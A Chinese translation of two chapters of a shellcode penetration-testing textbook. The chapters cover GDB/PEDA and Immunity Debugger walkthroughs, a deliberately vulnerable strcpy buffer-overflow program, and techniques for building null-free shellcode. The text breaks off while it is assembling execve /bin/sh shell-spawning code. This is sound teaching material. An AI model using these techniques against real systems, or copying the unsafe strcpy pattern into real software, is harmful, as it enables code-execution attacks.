# 渗透测试 Shellcode（二）

> 原文：[`annas-archive.org/md5/490B2CAE1041BE44E9F980C77B842689`](https://annas-archive.org/md5/490B2CAE1041BE44E9F980C77B842689)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：逆向工程

在本章中，我们将学习什么是逆向工程，以及如何使用调试器使我们真正看到幕后发生了什么。此外，我们将逐条查看每条指令的执行流程，以及如何使用和熟悉 Microsoft Windows 和 Linux 的调试器。

本章将涵盖以下主题：

+   在 Linux 中调试

+   在 Windows 中调试

+   任何代码的执行流

+   使用逆向工程检测和确认缓冲区溢出

我们开始吧？

# 在 Linux 中调试

在这里，我们将向您介绍一个最可爱和强大的调试器之一，GDB（GNU 调试器）。GDB 是一个开源的命令行调试器，可以在许多语言上工作，比如 C/C++，并且它默认安装在大多数 Linux 发行版上。

那么我们为什么要使用调试器呢？我们使用它们来查看每一步中寄存器、内存或堆栈的情况。此外，GDB 中还有反汇编，帮助我们理解汇编语言中每个函数的功能。

有些人觉得 GDB 难以使用，因为它是一个命令行界面，很难记住每个命令的参数等。让我们通过安装 PEDA 来使 GDB 对这些人更容忍，PEDA 用于增强 GDB 的界面。

**PEDA**代表**Python Exploit Development Assistance**，它可以使 GDB 更易于使用和更美观。

我们需要先下载它：

```
$ git clone https://github.com/longld/peda.git ~/peda
```

然后，将该文件复制到您`home`目录下的`gdbinit`中：

```
$ echo "source ~/peda/peda.py" >> ~/.gdbinit
```

然后，启动 GDB：

```
$ gdb
```

现在看起来毫无用处，但等等；让我们尝试调试一些简单的东西，比如我们的汇编*hello world*示例：

```
global _start

section .text
_start:

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_world
    mov rdx, length
    syscall

    mov rax, 60
    mov rdi, 11
    syscall

section .data

    hello_world: db 'hello there',0xa
    length: equ $-hello_world
```

让我们按照以下方式汇编和链接它：

```
$ nasm -felf64 hello.nasm -o hello.o
$ ld hello.o -o hello
```

现在使用 GDB 运行`./hello`如下：

```
$ gdb ./hello
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00139.jpeg)

我们将把反汇编模式设置为 Intel：

```
set disassembly-flavor intel
```

然后，我们将在想要逐步调试的地方设置断点，因为我们将跟踪所有指令，所以让我们在`_start`处设置断点：

```
break _start
```

上述命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00140.jpeg)

现在我们已经设置了断点，现在让我们在 GDB 中运行我们的应用程序使用`run`，它将继续运行直到触发断点。

您将看到三个部分（寄存器、代码和堆栈）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00141.jpeg)

以下截图是代码部分：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00142.jpeg)

正如您所看到的，左侧的小箭头指向下一条指令，即将`0x1`移动到`eax`寄存器。

下一个截图是堆栈部分：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00143.jpeg)

此外，我们可以使用命令`peda`找到许多命令选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00144.jpeg)

还有更多：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00145.jpeg)

所有这些都是 PEDA 命令；您也可以使用 GDB 命令。

现在，让我们继续我们的工作，输入`stepi`，或者您也可以使用`s`，这将开始执行一条指令，即`mov eax,0x1`：

`stepi`命令将进入`call`等指令，这将导致调试流程在该调用内部切换，而`s`命令或 step 不会这样做，它只会通过进入`call`指令来获取返回值。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00146.jpeg)

在上一个屏幕上，`RAX`寄存器内有`0x1`，下一条指令指向`mov edi,0x1`。现在让我们按*Enter*移动到下一条指令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00147.jpeg)

另外，正如您所看到的，RDI 寄存器内有`1`，下一条指令是`movabs rsi,0x6000d8`。让我们尝试看看内存地址`0x6000d8`中有什么，使用`xprint 0x6000d8`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00148.jpeg)

现在很明显，这是保存`hello there`字符串的位置。我们还可以使用`peda hexprint 0x6000d8`或`peda hexdump 0x6000d8`以十六进制转储它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00149.jpeg)

让我们继续使用`stepi`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00150.jpeg)

现在 RSI 寄存器持有指向`hello there`字符串的指针。

下一条指令是`mov edx,0xc`，将`12`移动到 EDX 寄存器，这是`hello there`字符串的长度。现在，让我们再次按下*Enter*键；显示如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00151.jpeg)

现在看 RDX 寄存器，它持有`0xc`，下一条指令是`syscall`。让我们继续使用`s`向前移动：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00152.jpeg)

现在`syscall`已经完成，打印了`hello there`字符串。

现在我们要执行`exit`系统调用，下一条指令是`mov eax,0x3c`，意思是将`60`移动到 RAX 寄存器。让我们继续向前使用`s`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00153.jpeg)

指令`mov edi,0xb`的意思是将`11`移动到 RDI 寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00154.jpeg)

RDI 现在持有`0xb`，下一条指令是`syscall`，将执行`exit`系统调用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00155.jpeg)

现在程序正常退出。

让我们看另一个例子，即 C 语言中的 hello world：

```
#include <stdio.h>

int main()
{
    printf ("hello world\n");
    return 0;
}
```

让我们编译它并使用 GDB 进行调试：

```
$ gcc hello.c -o hello
$ gdb ./hello
```

现在让我们将反汇编模式设置为 Intel：

```
set disassembly-flavor intel
```

在`main`函数处设置断点：

```
break main
```

现在，如果我们想查看任何函数的汇编指令，那么我们应该使用`disassemble`命令，后面跟着函数的名称。例如，我们想要反汇编`main`函数，因此我们可以使用`disassemble main`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00156.jpeg)

前两条指令是通过将 RBP 推送到堆栈来保存基指针或帧指针的内容，然后在最后，RBP 将被提取回来。让我们运行应用程序，以查看更多，使用`run`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00157.jpeg)

它停在`lea rdi,[rip+0x9f] # 0x5555555546e4`。

让我们检查一下那个位置里面有什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00158.jpeg)

它指向`hello world`字符串的位置。

让我们通过使用`stepi`或`s`向前迈进：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00159.jpeg)

如您所见，RDI 寄存器现在加载了`hello world`字符串的地址。

下一条指令`call 0x555555554510 <puts@plt>`，即调用`printf`函数，用于打印`hello world`字符串。

我们还可以检查`0x555555554510`的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00160.jpeg)

这是`jmp`指令；让我们也检查一下那个位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00161.jpeg)

现在，让我们使用`stepi`命令向前迈进：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00162.jpeg)

让我们再次向前迈进：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00163.jpeg)

下一条指令是`push 0x0`；让我们继续使用`stepi`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00164.jpeg)

下一条指令是`jmp 0x555555554500`；输入`s`向前迈进：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00165.jpeg)

现在我们在`printf`函数的实际执行内部；继续向前迈进，查看下一条指令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00166.jpeg)

下一条指令`call 0x7ffff7abc650 <strlen>`，意思是调用`strlen`函数来获取我们字符串的长度。

继续向前迈进，直到遇到`ret`指令，然后您又回到了我们的执行中，位于`printf`内部：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00167.jpeg)

让程序继续调试，直到出现错误，使用`continue`命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00168.jpeg)

在前面的例子中，我们没有遵循所有指令，而只是学习了如何使用 GDB 进行调试，并理解和调查每条指令。

# 在 Windows 中调试

现在，让我们尝试一些更高级但又非常简单的东西，而不涉及具体细节。在这里，我们将看到如果在 Windows 中使用缓冲区溢出代码会发生什么。我们将检测如果执行该代码，CPU 内部会发生什么。

首先，在 Windows 7 中打开*Code::Block*，然后转到文件菜单 | 新建 | 空文件。然后，编写我们的缓冲区溢出：

```
#include <stdio.h>
#include <string.h>

void copytobuffer(char* input)
{
    char buffer[15];
    strcpy (buffer,input);
}
int main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    return 0;
}
```

之后，转到文件菜单 | 保存文件，然后将其保存为`buffer.c`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00169.jpeg)

然后，转到构建菜单 | 构建。

然后，以管理员身份打开*Immunity Debugger*，从文件菜单 | 打开，选择可执行的缓冲文件，然后指定我们的输入，不是为了使我们的代码崩溃，而是为了看到区别，比如`aaaa`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00170.jpeg)

然后，点击 Open：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00171.jpeg)

要获得每个按钮的功能，请将鼠标悬停在其上并阅读状态栏。

例如，如果我将鼠标悬停在红色播放按钮![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00172.jpeg)上，它将在状态栏中显示其功能，即运行程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00173.jpeg)

让我们点击一次运行程序按钮。程序启动，然后停在程序入口点，即`main`函数。让我们再次点击该按钮，并注意状态栏中发生的变化：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00174.jpeg)

正如你所看到的，程序以零状态退出，这意味着没有错误。

好的，现在让我们尝试导致程序崩溃以查看区别。让我们关闭 Immunity Debugger 并再次运行它，然后打开相同的程序，但我们需要导致程序崩溃，因此指定参数，例如 40 个`a`字符：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00175.jpeg)

然后点击打开：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00176.jpeg)

让我们点击两次运行程序按钮，并注意状态栏中发生的变化：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00177.jpeg)

程序无法执行`61616161`；你知道为什么吗？这是我们的输入，61 是十六进制中的一个字符。

让我们看看寄存器和堆栈窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00178.jpeg)

请注意，堆栈中有 16 个`a`字符；我们的输入的其余部分填充了 EAX 寄存器并填充了 RIP，这就是为什么我们的应用程序抱怨无法执行`61616161`。

# 摘要

在本章中，我们讨论了调试以及如何在 Linux 和 Microsoft Windows 中使用调试器。我们还看了如何跟踪执行流程并了解幕后发生了什么。我们只是浅尝辄止这个主题，因为我们不想偏离我们的主要目标。现在让我们继续进行下一章，这一章将涵盖我们的主要目标之一：创建 shellcode。我们将看看我们将如何应用到目前为止学到的一切来创建我们定制的 shellcode。


# 第五章：创建 Shellcode

让我们准备好深入研究这个话题，我们将利用到目前为止学到的知识来创建简单的、完全定制的 shellcode。当我们面对坏字符并找到去除它们的方法时，这将变得更加有趣。接下来，我们将看到如何创建高级的 shellcode，并使用 Metasploit Framework 自动创建我们的 shellcode。

以下是本章将涵盖的主题：

+   基础知识和坏字符

+   相对地址技术

+   execve 系统调用

+   绑定 TCP shell

+   反向 TCP shell

+   使用 Metasploit 生成 shellcode

# 基础知识

首先，让我们从 shellcode 是什么开始。正如我们之前已经看到的，shellcode 是一种可以作为有效载荷注入到堆栈溢出攻击中的机器码，可以从汇编语言中获得。

所以我们要做的很简单：将我们希望 shellcode 执行的操作以汇编形式写下来，然后进行一些修改，并将其转换为机器码。

让我们尝试制作一个 hello world 的 shellcode，并将可执行形式转换为机器码。我们需要使用`objdump`命令：

```
$ objdump -D -M intel hello-world
```

上述命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00179.jpeg)

你看到红色矩形框里面的是什么？这是我们 hello world 示例的机器码。但是我们需要将它转换成这种形式：`\xff\xff\xff\xff`，其中`ff`代表操作码。你可以手动逐行进行转换，但这可能有点乏味。我们可以使用一行代码自动完成：

```
$ objdump -M intel -D FILE-NAME | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

让我们尝试用我们的代码：

```
$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s 
```

上述命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00180.jpeg)

这是我们的机器语言：

```
\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\xbe\xd8\x00\x60
\x00\x00\x00\x00\x00\xba\x0c\x00\x00\x00\x0f\x05\xb8\x3c\x00
\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\x68\x65\x6c\x6c\x6f\x20
\x77\x6f\x72\x6c\x64\x0a
```

接下来，我们可以使用以下代码来测试我们的机器：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] =

"\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\xbe\xd8\x00\x60
\x00\x00\x00\x00\x00\xba\x0c\x00\x00\x00\x0f\x05\xb8\x3c\x00
\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\x68\x65\x6c\x6c\x6f\x20
\x77\x6f\x72\x6c\x64\x0a";

int main()
{
   printf("Shellcode Length: %d\n", (int)strlen(code));
   int (*ret)() = (int(*)())code;
   ret();
}
```

让我们编译并运行它：

```
$ gcc -fno-stack-protector -z execstack hello-world.c 
$ ./a.out
```

上述命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00181.jpeg)

你可以从上面的输出中看到，我们的 shellcode 没有起作用。原因是其中有坏字符。这让我们进入下一节，讨论如何去除它们。

# 坏字符

坏字符是指可以破坏 shellcode 执行的字符，因为它们可能被解释为其他东西。

例如，考虑`\x00`，它表示零值，但它将被解释为空终止符，并用于终止一个字符串。现在，为了证明这一点，让我们再看一下之前的代码：

```
"\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\xbe\xd8\x00\x60
\x00\x00\x00\x00\x00\xba\x0c\x00\x00\x00\x0f\x05\xb8\x3c\x00
\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\x68\x65\x6c\x6c\x6f\x20
\x77\x6f\x72\x6c\x64\x0a";
```

当我们尝试执行它时，我们得到一个错误，`Shellcode Length: 14`。如果你看第 15 个操作码，你会看到`\x00`，它被解释为空终止符。

以下是坏字符的列表：

+   `00`：这是零值或空终止符（`\0`）

+   `0A`：这是换行符（`\n`）

+   `FF`：这是换页符（`\f`）

+   `0D`：这是回车符（`\r`）

现在，如何从我们的 shellcode 中删除这些坏字符呢？实际上，我们可以使用我们在汇编中已经知道的知识来删除它们，比如选择一个寄存器的哪一部分应该取决于移动数据的大小。例如，如果我想将一个小值（比如`15`）移动到 RAX，我们应该使用以下代码：

```
mov al, 15
```

或者，我们可以使用算术运算，例如将`15`移动到 RAX 寄存器：

```
xor rax, rax
add rax, 15
```

让我们逐条查看我们的机器码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00182.jpeg)

第一条指令是`mov rax, 1`，它包含`0`，因为我们试图将`1`字节（8 位）移动到 64 位寄存器。所以它会用零填充剩下的部分，我们可以使用`mov al, 1`来修复这个问题，这样我们就将`1`字节（8 位）移动到了 RAX 寄存器的 8 位部分；让我们确认一下：

```
global _start

section .text

_start:
    mov al, 1
    mov rdi, 1
    mov rsi, hello_world
    mov rdx, length
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

section .data
    hello_world: db 'hello world',0xa
    length: equ $-hello_world
```

现在，运行以下命令：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ objdump -D -M intel hello-world
```

上述命令的输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00183.jpeg)

我们成功从第一条指令中删除了所有的坏字符。让我们尝试另一种方法，使用算术运算，比如加法或减法。

首先，我们需要使用`xor`指令清除寄存器，`xor rdi, rdi`。现在 RDI 寄存器包含零；我们将其值加`1`，`add rdi, 1`：

```
global _start

section .text

_start:
    mov al, 1
    xor rdi, rdi
    add rdi, 1
    mov rsi, hello_world
    mov rdx, length
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

section .data
    hello_world: db 'hello world',0xa
    length: equ $-hello_world
```

现在运行以下命令：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ objdump -D -M intel hello-world
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00184.jpeg)

我们也修复了这个。让我们修复所有这些，把移动`hello world`字符串留到下一节：

```
global _start

section .text

_start:
    mov al, 1
    xor rdi, rdi
    add rdi, 1
    mov rsi, hello_world
    xor rdx,rdx
    add rdx,12 
    syscall

  xor rax,rax
  add rax,60
  xor rdi,rdi
  syscall

section .data
    hello_world: db 'hello world',0xa
```

现在运行以下命令：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ objdump -D -M intel hello-world
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00185.gif)

我们设法从我们的 shellcode 中删除了所有的坏字符，这让我们需要处理在复制字符串时的地址。

# 相对地址技术

相对地址是相对于 RIP 寄存器的当前位置，相对值是一种非常好的技术，可以避免在汇编中使用硬编码地址。

我们怎么做到的？实际上，通过使用`lea <destination>, [rel <source>]`，这个`rel`指令将计算相对于 RIP 寄存器的源地址，这样做变得非常简单。

我们需要在代码本身之前定义我们的变量，这样就必须在 RIP 当前位置之前定义它；否则，它将是一个短值，寄存器的其余部分将填充为零，就像这样：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00186.jpeg)

现在，让我们使用这种技术修改我们的 shellcode 来修复`hello world`字符串的位置：

```
global _start

section .text

_start:
    jmp code
    hello_world: db 'hello world',0xa

code:
    mov al, 1
    xor rdi, rdi
    add rdi, 1
    lea rsi, [rel hello_world]
    xor rdx,rdx
    add rdx,12 
    syscall

    xor rax,rax
    add rax,60
    xor rdi,rdi
    syscall
```

现在运行以下命令：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ objdump -D -M intel hello-world
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00187.gif)

一点坏字符都没有！让我们尝试它作为一个 shellcode：

```
$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00188.gif)

现在让我们尝试使用我们的 C 代码编译并运行这个 shellcode：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] =

"\xeb\x0c\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a\xb0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x8d\x35\xe4\xff\xff\xff\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";

int main()
{

    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();

}
```

现在运行以下命令：

```
$ gcc -fno-stack-protector -z execstack hello-world.c
$ ./a.out
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00189.gif)

成功了！现在，这是我们的第一个 shellcode。

让我们继续看看如何处理地址的更多技巧。

# jmp-call 技术

现在，我们将讨论如何处理字符串地址的新技术，即**jmp-call**技术。

这种技术简单地首先使`jmp`指令到我们想要移动到特定寄存器的字符串。之后，我们使用`call`指令调用实际的代码，将字符串的地址推入堆栈，然后我们将地址弹出到那个寄存器中。看看下一个例子，完全理解这种技术：

```
global _start

section .text

_start:
    jmp string

code:
    pop rsi
    mov al, 1
    xor rdi, rdi
    add rdi, 1
    xor rdx,rdx
    add rdx,12 
    syscall

    xor rax,rax
    add rax,60
    xor rdi,rdi
    syscall

string:
    call code
    hello_world: db 'hello world',0xa
```

现在运行以下命令：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ objdump -D -M intel hello-world
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00190.gif)

没有坏字符；现在让我们回顾一下我们做了什么。首先，我们执行了一个`jmp`指令到字符串，然后我们使用`call`指令调用了实际的代码，这将导致下一条指令被推入堆栈；让我们在 GDB 中看看这段代码：

```
$ gdb ./hello-world
$ set disassembly-flavor intel
$ break _start
$ run
$ stepi
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00191.jpeg)

下一条指令是使用`call code`指令调用代码。注意堆栈中将会发生什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00192.jpeg)

`hello world`字符串的地址被推入堆栈，下一条指令是`pop rsi`，它将`hello world`字符串的地址从堆栈移动到 RSI 寄存器。

让我们尝试将其作为一个 shellcode：

```
$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s 
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00193.jpeg)

在 C 代码中实现相同的操作：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\xeb\x1f\x5e\xb0\x01\x48\x31\xff\x48\x83\xc7\x01\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdc\xff\xff\xff\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x0a";
int main()
{
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

让我们编译并运行它：

```
$ gcc -fno-stack-protector -z execstack hello-world.c
$ ./a.out
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00194.gif)

# 堆栈技术

在这里，我们将学习另一种使用堆栈处理地址的技术。这很简单，但我们有两个障碍。首先，我们只允许一次将 4 个字节推入堆栈的操作——我们将使用寄存器来帮助我们。其次，我们必须以相反的顺序将字符串推入堆栈——我们将使用 Python 来为我们做这件事。

让我们尝试解决第二个障碍。使用 Python，我将定义`string = 'hello world\n'`，然后我将反转我的字符串，并使用`string[::-1].encode('hex')`一行将其编码为`hex`。接下来，我们将得到我们的反向编码字符串：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00195.gif)

完成！现在，让我们尝试解决第一个障碍：

```
global _start

section .text
_start:

    xor rax, rax
    add rax, 1
    mov rdi, rax
    push 0x0a646c72
    mov rbx, 0x6f57206f6c6c6548
    push rbx
    mov rsi, rsp
    xor rdx, rdx
    add rdx, 12
    syscall

    xor rax, rax
    add rax, 60 
    xor rdi, rdi 
    syscall
```

首先，我们将 8 个字节推入堆栈。我们可以将其余的内容分成 4 字节推入堆栈的每个操作，但我们也可以使用寄存器一次移动 8 个字节，然后将该寄存器的内容推入堆栈：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ objdump -M intel -D hello-world | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00196.jpeg)

让我们尝试将其用作 shellcode：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x48\x31\xc0\x48\x83\xc0\x01\x48\x89\xc7\x68\x72\x6c\x64\x0a\x48\xbb\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x53\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";
int main()
{
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

现在运行以下命令：

```
$ gcc -fno-stack-protector -z execstack hello-world.c
$ ./a.out
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00197.jpeg)

这也很容易。

在下一节中，我们将讨论如何使用`execve`系统调用制作有用的 shellcode。

# execve 系统调用

现在，我们将学习如何使用`execve`制作有用的 shellcode。在继续之前，我们必须了解`execve`系统调用是什么。它是一个用于执行程序或脚本的系统调用。让我们以使用 C 语言读取`/etc/issue`文件的`execve`的示例来说明。

首先，让我们看一下`execve`的要求：

```
$ man 2 execve
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00198.gif)

正如它所说，第一个参数是我们要执行的程序。

第二个参数`argv`是指向与我们要执行的程序相关的参数数组的指针。此外，`argv`应该包含程序的名称。

第三个参数是`envp`，其中包含我们想要传递给环境的任何参数，但我们可以将此参数设置为`NULL`。

现在，让我们构建 C 代码来执行`cat /etc/issue`命令：

```
#include <unistd.h>

int main()
{
    char * const argv[] = {"cat","/etc/issue", NULL};
    execve("/bin/cat", argv, NULL);
    return 0;
}
```

让我们编译并运行它：

```
$ gcc execve.c
$ ./a.out
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00199.jpeg)

它给了我们`/etc/issue`文件的内容，即`Kali GNU/Linux Rolling \n \l`。

现在，让我们尝试使用`execve`系统调用在汇编中执行`/bin/sh`。在这里，我将使用堆栈技术；让我们一步一步地完成这段代码：

```
 char * const argv[] = {"/bin/sh", NULL};
 execve("/bin/sh", argv, NULL);
 return 0;
```

首先，我们需要在堆栈中使用`NULL`作为分隔符。然后，我们将堆栈指针移动到 RDX 寄存器，以获取我们的第三个参数：

```
xor rax, rax
push rax
mov rdx, rsp
```

然后，我们需要将我们的路径`/bin/sh`推入堆栈中，由于我们只有七个字节，而且我们不希望我们的代码中有任何零，让我们推入`//bin/sh`或`/bin//sh`。让我们反转这个字符串，并使用 Python 将其编码为`hex`：

```
string ='//bin/sh'
string[::-1].encode('hex')
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00200.jpeg)

现在我们的字符串准备好了，让我们使用任何寄存器将其推入堆栈，因为它包含 8 个字节：

```
mov rbx, 0x68732f6e69622f2f
push rbx
```

让我们将 RSP 移动到 RDI 寄存器，以获取我们的第一个参数：

```
mov rdi, rsp
```

现在，我们需要推入另一个`NULL`作为字符串分隔符，然后我们需要通过推入 RDI 内容（即我们字符串的地址）将一个指针推入堆栈。然后，我们将堆栈指针移动到 RDI 寄存器，以获取第二个参数：

```
push rax
push rdi 
mov rsi,rsp 
```

现在，所有我们的参数都准备好了；让我们获取`execve`系统调用号：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep execve
```

上一个命令的输出显示在以下截图中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00201.jpeg)

`execve`系统调用号是`59`：

```
add rax, 59
syscall
```

让我们把我们的代码放在一起：

```
global _start

